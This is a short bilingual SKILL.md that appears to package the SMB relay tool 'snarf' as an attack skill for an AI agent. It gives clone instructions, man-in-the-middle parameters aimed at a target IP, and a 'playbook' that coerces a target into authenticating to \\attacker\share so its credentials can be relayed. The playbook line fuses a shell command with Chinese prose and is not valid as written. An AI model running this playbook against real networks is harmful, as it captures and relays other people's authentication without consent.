---
name: snarf-mitm-smb
description: "snarf: SMB authentication relay. Signals: MITM, mitm, SMB MITM, gateway, listen."
zh-signals: "snarf: SMB 认证中继。信号:中间人,mitm,SMB 中间人,网关,监听。"
---

# snarf

- 攻击大类:C40 嗅探与中间人攻击
- 上游仓库:https://github.com/purpleteam/snarf
- 上游 License:GPL-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/purpleteam/snarf && cd snarf
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `node snarf.js -i eth0 -t 10.0.0.5` | SMB 中间人 |
| `-i eth0 -g` | 网关 |
| `-l` | 监听 |

## 攻击场景 Playbook

### SMB 认证中继

```bash
node snarf.js -i eth0 && 目标访问 \\attacker\share
# 强制认证中继
```

## 注意事项

SMB 中间人+强制认证工具。
